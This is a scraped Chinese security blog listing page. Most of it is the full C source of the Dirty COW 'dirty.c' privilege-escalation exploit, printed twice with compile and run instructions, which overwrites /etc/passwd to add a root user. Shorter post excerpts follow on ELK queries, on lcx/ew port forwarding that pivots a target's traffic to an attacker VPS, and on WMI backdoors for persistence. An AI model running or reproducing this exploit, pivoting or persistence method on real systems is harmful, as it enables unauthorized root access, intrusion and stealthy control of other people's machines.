&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
&#x2F;&#x2F; and overwrites the root account with the generated line.
&#x2F;&#x2F; After running the exploit you should be able to login with the newly
&#x2F;&#x2F; created user.
&#x2F;&#x2F;
&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
&#x2F;&#x2F;   The default is &quot;firefart&quot;.
&#x2F;&#x2F;
&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
&#x2F;&#x2F;
&#x2F;&#x2F; Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
&#x2F;&#x2F;
&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
&#x2F;&#x2F;

#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys&#x2F;mman.h&gt;
#include &lt;sys&#x2F;types.h&gt;
#include &lt;sys&#x2F;stat.h&gt;
#include &lt;sys&#x2F;wait.h&gt;
#include &lt;sys&#x2F;ptrace.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;crypt.h&gt;

const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
const char *salt &#x3D; &quot;firefart&quot;;

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo &#123;
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
&#125;;

char *generate_password_hash(char *plaintext_pw) &#123;
  return crypt(plaintext_pw, salt);
&#125;

char *generate_passwd_line(struct Userinfo u) &#123;
  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret &#x3D; malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
&#125;

void *madviseThread(void *arg) &#123;
  int i, c &#x3D; 0;
  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
  &#125;
  printf(&quot;madvise %d\n\n&quot;, c);
&#125;

int copy_file(const char *from, const char *to) &#123;
  &#x2F;&#x2F; check if target file already exists
  if(access(to, F_OK) !&#x3D; -1) &#123;
    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
      to);
    return -1;
  &#125;

  char ch;
  FILE *source, *target;

  source &#x3D; fopen(from, &quot;r&quot;);
  if(source &#x3D;&#x3D; NULL) &#123;
    return -1;
  &#125;
  target &#x3D; fopen(to, &quot;w&quot;);
  if(target &#x3D;&#x3D; NULL) &#123;
     fclose(source);
     return -1;
  &#125;

  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
     fputc(ch, target);
   &#125;

  printf(&quot;%s successfully backed up to %s\n&quot;,
    from, to);

  fclose(source);
  fclose(target);

  return 0;
&#125;

int main(int argc, char *argv[])
&#123;
  &#x2F;&#x2F; backup file
  int ret &#x3D; copy_file(filename, backup_filename);
  if (ret !&#x3D; 0) &#123;
    exit(ret);
  &#125;

  struct Userinfo user;
  &#x2F;&#x2F; set values, change as needed
  user.username &#x3D; &quot;firefart&quot;;
  user.user_id &#x3D; 0;
  user.group_id &#x3D; 0;
  user.info &#x3D; &quot;pwned&quot;;
  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;

  char *plaintext_pw;

  if (argc &gt;&#x3D; 2) &#123;
    plaintext_pw &#x3D; argv[1];
    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
  &#125; else &#123;
    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
  &#125;

  user.hash &#x3D; generate_password_hash(plaintext_pw);
  char *complete_passwd_line &#x3D; generate_passwd_line(user);
  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);

  f &#x3D; open(filename, O_RDONLY);
  fstat(f, &amp;st);
  map &#x3D; mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
  pid &#x3D; fork();
  if(pid) &#123;
    waitpid(pid, NULL, 0);
    int u, i, o, c &#x3D; 0;
    int l&#x3D;strlen(complete_passwd_line);
    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
      for(o &#x3D; 0; o &lt; l; o++) &#123;
        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
          c +&#x3D; ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        &#125;
      &#125;
    &#125;
    printf(&quot;ptrace %d\n&quot;,c);
  &#125;
  else &#123;
    pthread_create(&amp;pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  &#125;

  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
    user.username, plaintext_pw);
    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
    backup_filename, filename);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
<pre class="line-numbers language-none"><code class="language-none">Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
&#x2F;&#x2F; as a base and automatically generates a new passwd line.
&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
&#x2F;&#x2F; and overwrites the root account with the generated line.
&#x2F;&#x2F; After running the exploit you should be able to login with the newly
&#x2F;&#x2F; created user.
&#x2F;&#x2F;
&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
&#x2F;&#x2F;   The default is &quot;firefart&quot;.
&#x2F;&#x2F;
&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
&#x2F;&#x2F;
&#x2F;&#x2F; Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
&#x2F;&#x2F;
&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
&#x2F;&#x2F;

#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys&#x2F;mman.h&gt;
#include &lt;sys&#x2F;types.h&gt;
#include &lt;sys&#x2F;stat.h&gt;
#include &lt;sys&#x2F;wait.h&gt;
#include &lt;sys&#x2F;ptrace.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;crypt.h&gt;

const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
const char *salt &#x3D; &quot;firefart&quot;;

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo &#123;
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
&#125;;

char *generate_password_hash(char *plaintext_pw) &#123;
  return crypt(plaintext_pw, salt);
&#125;

char *generate_passwd_line(struct Userinfo u) &#123;
  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret &#x3D; malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
&#125;

void *madviseThread(void *arg) &#123;
  int i, c &#x3D; 0;
  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
  &#125;
  printf(&quot;madvise %d\n\n&quot;, c);
&#125;

int copy_file(const char *from, const char *to) &#123;
  &#x2F;&#x2F; check if target file already exists
  if(access(to, F_OK) !&#x3D; -1) &#123;
    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
      to);
    return -1;
  &#125;

  char ch;
  FILE *source, *target;

  source &#x3D; fopen(from, &quot;r&quot;);
  if(source &#x3D;&#x3D; NULL) &#123;
    return -1;
  &#125;
  target &#x3D; fopen(to, &quot;w&quot;);
  if(target &#x3D;&#x3D; NULL) &#123;
     fclose(source);
     return -1;
  &#125;

  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
     fputc(ch, target);
   &#125;

  printf(&quot;%s successfully backed up to %s\n&quot;,
    from, to);

  fclose(source);
  fclose(target);

  return 0;
&#125;

int main(int argc, char *argv[])
&#123;
  &#x2F;&#x2F; backup file
  int ret &#x3D; copy_file(filename, backup_filename);
  if (ret !&#x3D; 0) &#123;
    exit(ret);
  &#125;

  struct Userinfo user;
  &#x2F;&#x2F; set values, change as needed
  user.username &#x3D; &quot;firefart&quot;;
  user.user_id &#x3D; 0;
  user.group_id &#x3D; 0;
  user.info &#x3D; &quot;pwned&quot;;
  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;

  char *plaintext_pw;

  if (argc &gt;&#x3D; 2) &#123;
    plaintext_pw &#x3D; argv[1];
    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
  &#125; else &#123;
    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
  &#125;

  user.hash &#x3D; generate_password_hash(plaintext_pw);
  char *complete_passwd_line &#x3D; generate_passwd_line(user);
  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);

  f &#x3D; open(filename, O_RDONLY);
  fstat(f, &amp;st);
  map &#x3D; mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
  pid &#x3D; fork();
  if(pid) &#123;
    waitpid(pid, NULL, 0);
    int u, i, o, c &#x3D; 0;
    int l&#x3D;strlen(complete_passwd_line);
    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
      for(o &#x3D; 0; o &lt; l; o++) &#123;
        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
          c +&#x3D; ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        &#125;
      &#125;
    &#125;
    printf(&quot;ptrace %d\n&quot;,c);
  &#125;
  else &#123;
    pthread_create(&amp;pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  &#125;

  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
    user.username, plaintext_pw);
    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
    backup_filename, filename);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/08/15/elk_basic.html" >elk操作相关</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-08-15  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p> kibana里面开始添加index的时候，先查看es的索引:</p>
<p> <code>curl &#39;localhost:9200/_cat/indices?v&#39;</code></p>
<p> 然后添加的时候直接写索引名字就行了。</p>
<p> 在kibana里面添加filter:</p>
<h3 id="搜索近三天的数据"><a href="#搜索近三天的数据" class="headerlink" title="搜索近三天的数据:"></a>搜索近三天的数据:</h3><pre class="line-numbers language-none"><code class="language-none"> 
 &#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;now-3d&quot;
      &#125;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="搜索某一天的数据"><a href="#搜索某一天的数据" class="headerlink" title="搜索某一天的数据:"></a>搜索某一天的数据:</h3><pre class="line-numbers language-none"><code class="language-none"> 
&#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;2017-08-15T01:00:00.900&quot;,
        &quot;lt&quot;: &quot;2017-08-15T23:59:00.900&quot;
      &#125;
    &#125;
  &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 在kibana里面的Dev Tools可以直接操作es数据库:</p>
<h3 id="查询数据库某一天的数据"><a href="#查询数据库某一天的数据" class="headerlink" title="查询数据库某一天的数据:"></a>查询数据库某一天的数据:</h3>
	

	</div>
  <a type="button" href="/2017/08/15/elk_basic.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p> kibana里面开始添加index的时候，先查看es的索引:</p>
<p> <code>curl &#39;localhost:9200/_cat/indices?v&#39;</code></p>
<p> 然后添加的时候直接写索引名字就行了。</p>
<p> 在kibana里面添加filter:</p>
<h3 id="搜索近三天的数据"><a href="#搜索近三天的数据" class="headerlink" title="搜索近三天的数据:"></a>搜索近三天的数据:</h3><pre class="line-numbers language-none"><code class="language-none"> 
 &#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;now-3d&quot;
      &#125;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="搜索某一天的数据"><a href="#搜索某一天的数据" class="headerlink" title="搜索某一天的数据:"></a>搜索某一天的数据:</h3><pre class="line-numbers language-none"><code class="language-none"> 
&#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;2017-08-15T01:00:00.900&quot;,
        &quot;lt&quot;: &quot;2017-08-15T23:59:00.900&quot;
      &#125;
    &#125;
  &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 在kibana里面的Dev Tools可以直接操作es数据库:</p>
<h3 id="查询数据库某一天的数据"><a href="#查询数据库某一天的数据" class="headerlink" title="查询数据库某一天的数据:"></a>查询数据库某一天的数据:</h3>
	
	</div>
  <a type="button" href="/2017/08/15/elk_basic.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/08/12/ew-slave.html" >ew端口转发与SOCKS5代理</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-08-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>首先第一点: 端口转发和socks代理两个是不一样的东西。</p>
<p>根据<a target="_blank" rel="noopener" href="http://rootkiter.com/2015/04/28/LCX_SOCKS.html">http://rootkiter.com/2015/04/28/LCX_SOCKS.html</a>里面提到的端口转发工具有三种工作状态:</p>
<ul>
<li>slave 客户端接客户端      -slave ConnectHost ConnectPort TransmitHost TransmitPort </li>
<li>tran  服务端接客户端      -tran  ConnectPort TransmitHost TransmitPort</li>
<li>listen 服务端接服务端     -listen ConnectPort TransmitPort</li>
</ul>
<p>再来个例子<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 &#x2F;&#x2F;目标机器的所有数据转发到公网vps的9000端口
lcx.exe -listen 9000 5555   &#x2F;&#x2F;将本机9000端口监听的数据转发到本机5555端口
通过上门两个端口转发，可以登陆vps上面的5555端口，或者vps上面127.0.0.1的的5555端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上面两个对应的ew是这么写的：</p>
<pre class="line-numbers language-none"><code class="language-none">ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389
.&#x2F;ew_for_linux64 -s lcx_listen -l 5555 -e 9000

第一个靶机可以抓发vps访问不到的ip，比如linux的22端口，也就是把这个机子作为跳板。 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h3><ul>
<li>如果目标有公网IP:</li>
</ul>
	

	</div>
  <a type="button" href="/2017/08/12/ew-slave.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>首先第一点: 端口转发和socks代理两个是不一样的东西。</p>
<p>根据<a target="_blank" rel="noopener" href="http://rootkiter.com/2015/04/28/LCX_SOCKS.html">http://rootkiter.com/2015/04/28/LCX_SOCKS.html</a>里面提到的端口转发工具有三种工作状态:</p>
<ul>
<li>slave 客户端接客户端      -slave ConnectHost ConnectPort TransmitHost TransmitPort </li>
<li>tran  服务端接客户端      -tran  ConnectPort TransmitHost TransmitPort</li>
<li>listen 服务端接服务端     -listen ConnectPort TransmitPort</li>
</ul>
<p>再来个例子<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 &#x2F;&#x2F;目标机器的所有数据转发到公网vps的9000端口
lcx.exe -listen 9000 5555   &#x2F;&#x2F;将本机9000端口监听的数据转发到本机5555端口
通过上门两个端口转发，可以登陆vps上面的5555端口，或者vps上面127.0.0.1的的5555端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上面两个对应的ew是这么写的：</p>
<pre class="line-numbers language-none"><code class="language-none">ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389
.&#x2F;ew_for_linux64 -s lcx_listen -l 5555 -e 9000

第一个靶机可以抓发vps访问不到的ip，比如linux的22端口，也就是把这个机子作为跳板。 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h3><ul>
<li>如果目标有公网IP:</li>
</ul>
	
	</div>
  <a type="button" href="/2017/08/12/ew-slave.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/07/12/wmi.html" >WMI学习笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-07-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="windows下的定时任务"><a href="#windows下的定时任务" class="headerlink" title="windows下的定时任务"></a>windows下的定时任务</h3><blockquote>
<p>维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序，未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难</p>
</blockquote>
<h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>wmi的逻辑结构是这样的：<br>首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。</p>
<p>静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）</p>
<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
<p>可以调用wmi的方式或者语言:</p>
<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
* winrm.exe
* winrs.exe
* powershell
* windows scripting host(WSH)
   * VBScript
   * JScript
* mof
* C&#x2F;C++ via IWbem* COM API
* .NET System.Management classes
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>单一点：<br>一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:</p>
<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
	

	</div>
  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="windows下的定时任务"><a href="#windows下的定时任务" class="headerlink" title="windows下的定时任务"></a>windows下的定时任务</h3><blockquote>
<p>维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序，未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难</p>
</blockquote>
<h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>wmi的逻辑结构是这样的：<br>首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。</p>
<p>静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）</p>
<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
<p>可以调用wmi的方式或者语言:</p>
<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
* winrm.exe
* winrs.exe
* powershell
* windows scripting host(WSH)
   * VBScript
   * JScript
* mof
* C&#x2F;C++ via IWbem* COM API
* .NET System.Management classes
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>单一点：<br>一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:</p>
